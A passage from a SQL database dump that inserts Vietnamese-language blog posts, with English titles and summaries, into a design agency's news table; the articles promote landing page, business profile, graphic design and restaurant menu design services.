t&igrave;m một đơn vị thiết kế website Landing Page l&agrave; v&ocirc; c&ugrave;ng cần thiết.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">2. C&oacute; những loại website Landing Page n&agrave;o ?</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Landing Page th&ocirc;ng thường c&oacute; thể chia ra l&agrave;m nhiều loại kh&aacute;c nhau, d&ugrave; đ&acirc;y cũng chỉ l&agrave; một mục ti&ecirc;u chung hay một h&igrave;nh thức thể hiện, nhưng phong c&aacute;ch thiết kế lại cần tập trung v&agrave;o sự độc đ&aacute;o v&agrave; hấp dẫn.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Website Landing Page chủ yếu được chia l&agrave;m c&aacute;c loại sau :</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">+ Website Landing Page c&oacute; dạng khung Pop-up quảng c&aacute;o, loại h&igrave;nh n&agrave;y thưởng mở ra khi người d&ugrave;ng bắt đầu truy cập v&agrave;o trang chủ website mới, y&ecirc;u cầu nhập th&ocirc;ng tin c&aacute; nh&acirc;n, m&atilde; code khuyến mại hoặc tin tức doanh nghiệp.</span></p>\r\n<p style=\"text-align: center;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\"><img src=\"http://brity.vn/upload/5_1.png\" alt=\"\" width=\"800\" height=\"600\" /></span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">+ Website Landing Page c&oacute; dạng Microsite l&agrave; dạng website chỉ c&oacute; 1 trang ri&ecirc;ng, c&oacute; t&ecirc;n miền phụ hoặc t&ecirc;n miền ri&ecirc;ng, nội dung trong trang c&oacute; nhiều nội dung li&ecirc;n quan, c&oacute; link dẫn trực tiếp về website ch&iacute;nh.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">3. L&agrave;m sao để thiết kế website Landing Page đẹp v&agrave; chuy&ecirc;n nghiệp</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Đối với mỗi đơn vị, doanh nghiệp th&igrave; việc thiết kế một website Landing Page đẹp v&agrave; chuy&ecirc;n nghi&ecirc;p v&ocirc; c&ugrave;ng quan trọng, trong đ&oacute; chủ yếu c&oacute; những phương ph&aacute;p sau m&agrave; bạn c&oacute; thể tham khảo :</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">+ Cần chọn ti&ecirc;u đề hợp l&yacute; cho website Landing Page, trong đ&oacute; ch&uacute;ng ta c&oacute; thể x&acirc;y dựng gi&aacute; trị cụ thể cho người xem khi họ v&agrave;o trang v&agrave; thực hiện h&agrave;nh vi như bạn muốn ( thu thập th&ocirc;ng tin, mua h&agrave;ng, xem th&ocirc;ng tin&hellip;.) từ đ&oacute; gi&uacute;p kh&aacute;ch h&agrave;ng nhận định r&otilde; r&agrave;ng hơn về mục đ&iacute;ch của trang website Landing Page.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">+ Chọn lựa mục ti&ecirc;u, h&agrave;nh động cụ thể của kh&aacute;ch h&agrave;ng m&agrave; bạn mong muốn, trong đ&oacute; ch&uacute;ng ta phải x&aacute;c định r&otilde; r&agrave;ng mục ti&ecirc;u của bản th&acirc;n khi thiết kế website Landing Page, tập trung v&agrave;o mục ti&ecirc;u m&agrave; bạn mong muốn, khuyến kh&iacute;ch h&agrave;nh động đ&oacute; của kh&aacute;ch h&agrave;ng, x&acirc;y dựng cần đảm bảo đơn giản, dễ l&agrave;m để kh&aacute;ch h&agrave;ng c&oacute; thể trải nghiệm website Landing Page th&uacute; vị hơn.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">+ L&agrave;m mẫu đăng k&yacute; thu h&uacute;t, đơn giản khi thiết kế website Landing Page cũng gi&uacute;p kh&aacute;ch h&agrave;ng dễ thực hiện c&aacute;c thao t&aacute;c hơn, trong đ&oacute; mẫu đăng k&yacute; th&ocirc;ng tin tốt nhất n&ecirc;n tối giản, chỉ cần những th&ocirc;ng tin quan trọng như t&ecirc;n, địa chỉ mail, số điện thoại l&agrave; được.</span></p>\r\n<p style=\"text-align: center;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\"><img src=\"http://brity.vn/upload/6.png\" alt=\"\" width=\"800\" height=\"600\" /></span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">+ X&acirc;y dựng nội dung website Landing Page r&otilde; r&agrave;ng, dễ hiểu, tập trung v&agrave;o nội dung ch&iacute;nh m&agrave; ch&uacute;ng ta cần truyền tải, điều hướng tới người d&ugrave;ng, quan trọng l&agrave; ch&uacute; &yacute; tuyệt đối kh&ocirc;ng được nhồi nh&eacute;t qu&aacute; nhiều lượng th&ocirc;ng tin.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">+ X&acirc;y dựng video v&agrave; h&igrave;nh ảnh mắt mắt, thu h&uacute;t cũng l&agrave; một ti&ecirc;u ch&iacute; quan trọng để thiết kế website Landing Page th&agrave;nh c&ocirc;ng, trong đ&oacute; những video, h&igrave;nh ảnh n&agrave;y n&ecirc;n tập trung chủ yếu v&agrave;o sản phẩm, c&oacute; thể d&ugrave;ng th&ecirc;m Infographic gi&uacute;p cho website Landing Page của bạn c&agrave;ng th&ecirc;m hấp dẫn v&agrave; hiệu quả nhất.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Để đảm bảo thiết kế website Landing Page của doanh nghiệp kh&aacute;ch h&agrave;ng c&oacute; thể sử dụng c&aacute;c phần mềm, c&ocirc;ng cụ cơ bản tr&ecirc;n internet.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Tuy nhi&ecirc;n nếu kh&aacute;ch h&agrave;ng muốn đảm bảo thiết kế những website Landing Page chuy&ecirc;n nghiệp, đẹp mắt v&agrave; hấp dẫn, thu h&uacute;t người xem th&igrave; c&oacute; thể t&igrave;m tới dịch vụ thiết kế website Landing Page tại GCO ch&uacute;ng t&ocirc;i để nhận được những th&agrave;nh phẩm ho&agrave;n hảo nhất với mức gi&aacute; hợp l&yacute;.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">&nbsp;<img src=\"http://brity.vn/upload/7.png\" alt=\"\" width=\"800\" height=\"600\" /></span></p>', '<p>Website design is a very familiar concept in the field of website design, especially with businesses who want to attract customers, building reputation with users and visitors.</p>', 1, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'tin-tuc', 0, '2018-10-17 14:46:44', '2018-10-17 07:46:44');
INSERT INTO `news` (`id`, `cate_id`, `user_id`, `name`, `name_en`, `alias`, `alias_en`, `photo`, `background`, `mota`, `mota_en`, `content`, `content_en`, `status`, `noibat`, `title`, `title_en`, `keyword`, `keyword_en`, `description`, `description_en`, `com`, `stt`, `created_at`, `updated_at`) VALUES
(30, 0, 5, 'Những điều bạn cần chú ý khi thiết kế profile doanh nghiệp', 'Things to keep in mind to when designing your business profile', 'nhung-dieu-ban-can-chu-y-khi-thiet-ke-profile-doanh-nghiep', 'things-to-keep-in-mind-to-when-designing-your-business-profile', '1539786633_23.jpg', '', 'Một cuốn profile đẹp mắt và chuyên nghiệp có thể xem là nền tảng cơ bản', NULL, '<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Với bất cứ một c&ocirc;ng ty, doanh nghiệp hay đơn vị n&agrave;o khi kinh doanh sản phẩm, dịch vụ đều cần phải c&oacute; hồ sơ năng lực của c&ocirc;ng ty. Một cuốn profile đẹp mắt v&agrave; chuy&ecirc;n nghiệp c&oacute; thể xem l&agrave; nền tảng cơ bản để doanh nghiệp của bạn thu h&uacute;t kh&aacute;ch h&agrave;ng hơn, v&igrave; vậy việc <strong><em><u>thiết kế profile doanh nghiệp</u></em></strong> chuy&ecirc;n nghiệp l&agrave; ti&ecirc;u ch&iacute; quan trọng kh&ocirc;ng thể thiếu của bất cứ một doanh nghiệp n&agrave;o.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">1. Thiết kế profile doanh nghiệp b&aacute;m s&aacute;t v&agrave;o c&aacute;c dự &aacute;n, dịch vụ</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Th&ocirc;ng thường một c&ocirc;ng ty c&oacute; một cuốn profile chuy&ecirc;n nghiệp đủ sức thuyết phục kh&aacute;ch h&agrave;ng thường dễ d&agrave;ng nhận được hợp đồng, dự &aacute;n hơn cả, &nbsp;từ đ&oacute; c&agrave;ng tạo dựng được l&ograve;ng tin của kh&aacute;ch h&agrave;ng đối với đơn vị doanh nghiệp của bạn.</span></p>\r\n<p style=\"text-align: center;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/22_4.jpg\" alt=\"\" width=\"2340\" height=\"1560\" /></span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Ch&iacute;nh v&igrave; vậy một bản <strong>thiết kế profile doanh nghiệp</strong> lu&ocirc;n cần đảm bảo x&aacute;c định r&otilde; r&agrave;ng được mục ti&ecirc;u v&agrave; dự &aacute;n trước khi cho ra đời hồ sơ năng lực của c&ocirc;ng ty, trong đ&oacute; hồ sơ năng lực kh&ocirc;ng chỉ cần c&oacute; đầy đủ bộ m&aacute;y hoạt động của doanh nghiệp m&agrave; c&ograve;n k&egrave;m th&ecirc;m số lượng, chất lượng nh&acirc;n sự, kinh nghiệm c&ocirc;ng việc, th&agrave;nh tựu đạt được, đối t&aacute;c tin cậy c&ugrave;ng nhiều th&ocirc;ng tin kh&aacute;ch đảm bảo c&oacute; thể thuyết phục được kh&aacute;ch h&agrave;ng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Với những kh&aacute;ch h&agrave;ng sử dụng c&aacute;c dịch vụ thiết kế profile doanh nghiệp uy t&iacute;n, chất lượng như GCO lu&ocirc;n đảm bảo thiết kế v&agrave; cung cấp cho kh&aacute;ch h&agrave;ng bản profile đẹp mắt, thu h&uacute;t, hấp dẫn v&agrave; đầy lực thuyết phục với kh&aacute;ch h&agrave;ng khi sử dụng sản phẩm.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">2. Tạo đặc điểm vượt trội của doanh nghiệp</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Tất nhi&ecirc;n một bản profile doanh nghiệp được thiết kế ho&agrave;n hảo bao giờ cũng cần phải c&oacute; đặc điểm vượt trội để đ&aacute;nh gục mọi đối thủ cạnh tranh, gi&uacute;p kh&aacute;ch h&agrave;ng ưu ti&ecirc;n sử dụng dịch cụ của doanh nghiệp bạn nhiều nhất.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Để l&agrave;m được điều n&agrave;y&nbsp; trước khi thiết kế profile doanh nghiệp th&igrave; doanh nghiệp đ&oacute; cần cung cấp đầy đủ th&ocirc;ng tin cần thiết của doanh nghiệp m&igrave;nh, trong đ&oacute; k&egrave;m theo th&ocirc;ng tin của những đối thủ cạnh tranh chủ yếu của doanh nghiệp bạn.</span></p>\r\n<p style=\"text-align: center;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/24.jpg\" alt=\"\" width=\"1600\" height=\"1200\" /></span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Khi đ&atilde; x&aacute;c định được những đối thủ cạnh tranh chủ yếu của doanh nghiệp, c&aacute;c chuy&ecirc;n gia thiết kế tại GCO sẽ tiến h&agrave;nh nghi&ecirc;n cứu chuy&ecirc;n s&acirc;u, ph&acirc;n t&iacute;ch v&agrave; t&igrave;m t&ograve;i những điểm mạnh, điểm yếu, kh&aacute;c biệt của doanh nghiệp bạn với c&aacute;c đơn vị cạnh tranh xung quanh, từ đ&oacute; t&igrave;m ra được kh&aacute;c biệt duy nhất m&agrave; chỉ doanh nghiệp bạn mới c&oacute; được, tạo điểm vượt trội của doanh nghiệp để thu h&uacute;t kh&aacute;ch h&agrave;ng, từ đ&oacute; tăng cường khả năng cạnh tranh hơn hẳn.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Đ&ocirc;i khi ch&iacute;nh sự kh&aacute;c biệt với đối thủ, x&acirc;y dựng điểm mạnh nổi bật của doanh nghiệp sẽ g&oacute;p phần mang thương hiệu của doanh nghiệp bạn tới tay người d&ugrave;ng gần gũi hơn, lộ r&otilde; được điểm yếu của đối thủ cạnh tranh, tạo ra profile ho&agrave;n hảo cho daonh nghiệp.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">3. Đầu tư v&agrave;o h&igrave;nh ảnh c&ugrave;ng phong c&aacute;ch thiết kế</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Để c&oacute; được một bản <strong>thiết kế profile doanh nghiệp</strong> ho&agrave;n hảo th&igrave; h&igrave;nh ảnh c&ugrave;ng với phong c&aacute;ch thiết kế ch&iacute;nh l&agrave; điều quyết định cuối c&ugrave;ng để tạo n&ecirc;n th&agrave;nh c&ocirc;ng cho hồ sơ năng lực của doanh nghiệp.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Với một bản profile doanh nghiệp c&oacute; h&igrave;nh ảnh đẹp mắt, phong c&aacute;ch thiết kế độc đ&aacute;o v&agrave; thu h&uacute;t bao giờ cũng thể hiện r&otilde; được đẳng cấp của doanh nghiệp, thể hiện chi tiết hơn qua c&aacute;c h&igrave;nh ảnh ch&acirc;n thật, đẹp mắt trong profile, từ đ&oacute; tạo dựng được chất lượng ho&agrave;n hảo trong mắt người ti&ecirc;u d&ugrave;ng.</span></p>\r\n<p style=\"text-align: center;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/25_1.jpg\" alt=\"\" width=\"1600\" height=\"1200\" /></span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Trong đ&oacute; bản profile doanh nghiệp đẹp kh&ocirc;ng chỉ cần c&oacute; h&igrave;nh ảnh sắc n&eacute;t, đẹp mắt m&agrave; nội dung truyền tải cũng cần ph&ugrave; hợp với c&aacute;c dự &aacute;n m&agrave; kh&aacute;ch h&agrave;ng cần, độ n&eacute;t h&igrave;nh ảnh cao v&agrave; ph&ugrave; hợp với chức năng thể hiện, l&agrave;m nổi bật thế mạnh của doanh nghiệp trong từng bản thiết kế.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Để t&igrave;m được một đơn vị thiết kế profile doanh nghiệp uy t&iacute;n, chất lượng, kh&aacute;ch h&agrave;ng c&oacute; thể t&igrave;m tới c&aacute;c chuy&ecirc;n gia s&aacute;ng tạo tại GCO để x&acirc;y dựng được một bản profile doanh nghiệp ho&agrave;n mỹ nhất cho c&ocirc;ng ty của bạn.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Những bản profile doanh nghiệp được thiết kế tại Brity lu&ocirc;n cam kết gia tăng cơ hội d&ugrave;ng gi&aacute; trị thương hiệu của doanh nghiệp.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">&nbsp;<img src=\"http://brity.vn/upload/26.jpg\" alt=\"\" width=\"1600\" height=\"1200\" /></span></p>', '<p>A beautiful and professional profile design is the basis to attract customers, an indispensable elements for the success of any business</p>\r\n<p>&nbsp;</p>', 1, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'tin-tuc', 0, '2018-10-17 14:37:02', '2018-10-17 07:37:02'),
(31, 0, 5, 'Những kỹ năng thiết kế đồ họa quan trọng mà bạn nên biết', 'Important graphic design skills you should know', 'nhung-ky-nang-thiet-ke-do-hoa-quan-trong-ma-ban-nen-biet', 'important-graphic-design-skills-you-should-know', '1539786266_20.jpg', '', 'Kỹ năng thiết kế đồ họa là một trong những công việc yêu cầu cần phải có tính sáng tạo cao', NULL, '<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><strong><em><u>Kỹ năng thiết kế đồ họa</u></em></strong> <strong>l&agrave; một trong những c&ocirc;ng việc y&ecirc;u cầu cần phải c&oacute; t&iacute;nh s&aacute;ng tạo cao, đ&acirc;y cũng l&agrave; một trong những c&ocirc;ng việc thu h&uacute;t được sự quan t&acirc;m của rất nhiều giới trẻ hiện nay, kh&ocirc;ng chỉ cần c&oacute; sự s&aacute;ng tạo m&agrave; c&ograve;n cần phải độc đ&aacute;o, c&oacute; t&iacute;nh đột ph&aacute; . Dưới đ&acirc;y ch&iacute;nh l&agrave; một số kỹ năng m&agrave; một nh&agrave; thiết kế đồ họa cần phải c&oacute;</strong></span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">1. Cần c&oacute; một phong c&aacute;ch c&aacute; nh&acirc;n ri&ecirc;ng</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><strong>Ng&agrave;nh thiết kế đồ họa</strong> lu&ocirc;n ưu ti&ecirc;n sự độc đ&aacute;o v&agrave;o s&aacute;ng tạo ri&ecirc;ng. Để trở th&agrave;nh một chuy&ecirc;n vi&ecirc;n thiết kế đồ họa được nhiều người biết đến v&agrave; tạo ra những sản phẩm độc đ&aacute;o, bạn cần phải c&oacute; c&aacute; t&iacute;nh ri&ecirc;ng v&agrave; thể hiện được những s&aacute;ng tạo đ&oacute;. Nếu đ&atilde; tạo dựng v&agrave; g&acirc;y được tiếng vang với t&iacute;nh c&aacute;ch ri&ecirc;ng, kh&aacute;ch h&agrave;ng đ&ocirc;i khi thậm ch&iacute; kh&ocirc;ng cần nh&igrave;n chữ k&yacute; cũng biết được đ&oacute; l&agrave; t&aacute;c phẩm của bạn v&agrave; họ sẽ tự t&igrave;m đến bạn khi cần.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Để c&oacute; thể <strong>học thiết kế</strong> hiệu quả nhất th&igrave; bạn n&ecirc;n bắt đầu quan t&acirc;m đến c&aacute;c chi tiết tr&ecirc;n một tấm &aacute;p-ph&iacute;ch hay bất k&igrave; thứ g&igrave; c&oacute; h&igrave;nh họa/chữ nghĩa thiết kế, thậm ch&iacute; l&agrave; những chi tiết nhỏ nhất như font chữ hay m&agrave;u sắc của logo. H&atilde;y bắt đầu bằng việc quan s&aacute;t mọi thứ xung quanh v&agrave; tự nhủ &ldquo;nếu l&agrave; m&igrave;nh, m&igrave;nh sẽ&hellip;&rdquo; trước một sản phẩm thiết kế n&agrave;o đ&oacute;.</span></p>\r\n<p style=\"text-align: center;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/21_1.jpg\" alt=\"\" width=\"2000\" height=\"860\" /></span></p>\r\n<h2 style=\"text-align: left;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">2. Phải ch&uacute; &yacute; tới từng chi tiết nhỏ</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Để c&oacute; thể <strong>học thiết kế</strong> hiệu quả nhất th&igrave; bạn n&ecirc;n bắt đầu quan t&acirc;m đến c&aacute;c chi tiết tr&ecirc;n một tấm &aacute;p-ph&iacute;ch hay bất k&igrave; thứ g&igrave; c&oacute; h&igrave;nh họa/chữ nghĩa thiết kế, thậm ch&iacute; l&agrave; những chi tiết nhỏ nhất như font chữ hay m&agrave;u sắc của logo. H&atilde;y bắt đầu bằng việc quan s&aacute;t mọi thứ xung quanh v&agrave; tự nhủ &ldquo;nếu l&agrave; m&igrave;nh, m&igrave;nh sẽ&hellip;&rdquo; trước một sản phẩm thiết kế n&agrave;o đ&oacute;.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">3. Cần c&oacute; tr&igrave;nh độ kiến thức vững chắc</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Khi đi xin việc, th&ocirc;ng thường nh&agrave; tuyển dụng sẽ ưu ti&ecirc;n những ứng vi&ecirc;n c&oacute; bằng cấp hơn. Hơn nữa việc được học tập trong m&ocirc;i trường gi&aacute;o dục v&agrave; đ&agrave;o tạo chuy&ecirc;n m&ocirc;n sẽ gi&uacute;p bạn c&oacute; được nền kiến thức vững chắc. Tuy nhi&ecirc;n lưu &yacute; l&agrave; việc tự m&agrave;y m&ograve; học hỏi cũng v&ocirc; c&ugrave;ng quan trọng đối với lĩnh vực n&agrave;y, đặc biệt l&agrave; đối với c&aacute;c phần mềm kh&aacute;c nhau: Adobe Photoshop, Adobe Illustrator, Quark Express hay Adobe InDesign, Flash&hellip; C&aacute;c kiến thức về kiểu in (typography) cũng rất cần thiết v&igrave; đ&oacute; ch&iacute;nh l&agrave; một trong những yếu tố quyết định một thiết kế hiệu quả. Bạn c&oacute; thể tham khảo c&aacute;c nguồn th&ocirc;ng tin về thiết kế đồ họa tại đ&acirc;y.</span></p>\r\n<p style=\"text-align: center;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/21_2.jpg\" alt=\"\" width=\"1920\" height=\"1080\" /></span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">4. Phải c&oacute; khả năng l&agrave;m việc nh&oacute;m cao</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">L&agrave;m việc nh&oacute;m kh&ocirc;ng nhất thiết l&agrave; bạn phải l&agrave;m việc với tất thảy những người bạn y&ecirc;u qu&yacute;. Quan trọng l&agrave; bạn l&agrave;m tr&ograve;n tr&aacute;ch nhiệm v&agrave; t&ocirc;n trọng những quy tắc trong nh&oacute;m để đưa ra th&agrave;nh quả <strong>c&ocirc;ng việc thiết kế đồ họa</strong> tốt nhất l&agrave; được.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">5. Biết quản l&yacute; thời gian hiệu quả</span></strong></h2>\r\n<p style=\"text-align: center;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/22_2.jpg\" alt=\"\" width=\"1348\" height=\"899\" /></span></strong></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">C&aacute;c kh&aacute;ch h&agrave;ng lu&ocirc;n muốn nhận c&aacute;c sản phẩm y&ecirc;u cầu đ&uacute;ng thời hạn. V&igrave; thế bạn phải biết c&aacute;ch quản l&yacute; ng&acirc;n quỹ thời gian của m&igrave;nh để đảm bảo đ&uacute;ng tiến độ. Đ&ocirc;i khi việc ưu ti&ecirc;n thứ tự c&ocirc;ng việc c&ograve;n phải phụ thuộc v&agrave;o khối lượng c&ocirc;ng việc, nhưng yếu tố thời gian đ&uacute;ng l&agrave; n&ecirc;n được quan t&acirc;m trước nhất để tạo được uy t&iacute;n v&agrave; sự chuy&ecirc;n nghiệp.&nbsp;</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">C&ograve;n rất nhiều những b&agrave;i học trong v&agrave; ngo&agrave;i chuy&ecirc;n m&ocirc;n kh&aacute;c nữa để r&egrave;n luyện nếu bạn thực sự muốn trở th&agrave;nh một chuy&ecirc;n vi&ecirc;n thiết kế thực thụ. Bạn c&oacute; thể đọc 50 lời khuy&ecirc;n cho học sinh ng&agrave;nh graphic design&nbsp; hoặc blog của một thiết kế đồ họa người Ph&aacute;p để tham khảo th&ecirc;m.</span></p>', '<p>Graphic designning is something with a high level of creativity. Today, it is one of most the attractive jobs to the young which require not just normal creativity but also uniqueness and breakthrough. Here are some of the skills that a graphic designer should have</p>', 1, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'tin-tuc', 0, '2018-10-17 14:27:43', '2018-10-17 07:27:43'),
(32, 0, 5, 'Đi tìm tiêu chí thiết kế thực đơn nhà hàng giúp bạn gia tăng lợi nhuận', 'Finding the restaurant menu design recipe to maximize profits', 'di-tim-tieu-chi-thiet-ke-thuc-don-nha-hang-giup-ban-gia-tang-loi-nhuan', 'finding-the-restaurant-menu-design-recipe-to-maximize-profits', '1539786173_17.jpg', '', 'Thực đơn là thành phần vô cùng quan trọng với nhà hàng', NULL, '<p style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Thực đơn l&agrave; th&agrave;nh phần v&ocirc; c&ugrave;ng quan trọng với nh&agrave; h&agrave;ng, v&igrave; vậy đảm bảo c&oacute; thể thu h&uacute;t thực kh&aacute;ch th&igrave; việc <em><u>thiết kế thực đơn nh&agrave; h&agrave;ng</u></em> ấn tượng, đẹp mắt v&agrave; độc đ&aacute;o l&agrave; kh&ocirc;ng thể thiếu.</span></strong></p>\r\n<p style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Dưới đ&acirc;y l&agrave; một số ti&ecirc;u ch&iacute; thiết kế thực đơn nh&agrave; h&agrave;ng m&agrave; kh&aacute;ch h&agrave;ng c&oacute; thể tham khảo.</span></strong></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">1. Thiết kế m&oacute;n ăn bắt mắt</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Một trong những ti&ecirc;u ch&iacute; đầu ti&ecirc;n khi thiết kế thực đơn nh&agrave; h&agrave;ng ch&uacute;ng ta cần ghi nhớ l&agrave; phải thiết kế m&oacute;n ăn bắt mắt.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Ch&uacute;ng ta đều biết người d&ugrave;ng chọn lựa m&oacute;n ăn thường bằng mắt nh&igrave;n ắt, v&igrave; vậy nếu bạn muốn đem tới cho kh&aacute;ch h&agrave;ng một thực đơn ho&agrave;n hảo, ấn tượng th&igrave; h&igrave;nh ảnh m&oacute;n ăn phải đảm bảo thiết kế khổ lớn tr&ecirc;n thực đơn, trong đ&oacute; h&igrave;nh ảnh m&oacute;n ăn phải bắt mắt v&agrave; ấn tượng, hấp dẫn thực kh&aacute;ch.</span></p>\r\n<p style=\"text-align: center;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/4.png\" alt=\"\" width=\"1400\" height=\"931\" /></span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">B&ecirc;n cạnh đ&oacute; những m&oacute;n ăn được thiết kế trong thực đơn tốt nhất n&ecirc;n đ&oacute;ng khung lại hoặc cần được viết bằng chữ in đậm hoặc in nghi&ecirc;ng trong thực đơn, điều n&agrave;y cũng gi&uacute;p m&oacute;n ăn trong thực đơn b&aacute;n chạy hơn nhiều so với những thực đơn được in v&agrave; thiết kế theo kiểu th&ocirc;ng thường.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">2. Tập trung v&agrave;o phần giữa thực đơn</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Đa phần khi thực kh&aacute;ch xem thực đơn v&agrave; chọn m&oacute;n ăn, hầu hết những m&oacute;n ăn ở phần giữa thực đơn đề dễ d&agrave;ng thu h&uacute;t thực kh&aacute;ch hơn nhiều so với những phần c&ograve;n lại trong thực đơn, v&igrave; vậy khi thiết kế thực đơn nh&agrave; h&agrave;ng tốt nhất ch&uacute;ng ta n&ecirc;n in những m&oacute;n ăn mang lại nhiều lợi nhuận nhất trong phần giữa của thực đơn nh&agrave; h&agrave;ng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Ngo&agrave;i ra thực đơn được in trong menu phải đảm bảo được viết ch&iacute;nh x&aacute;c, 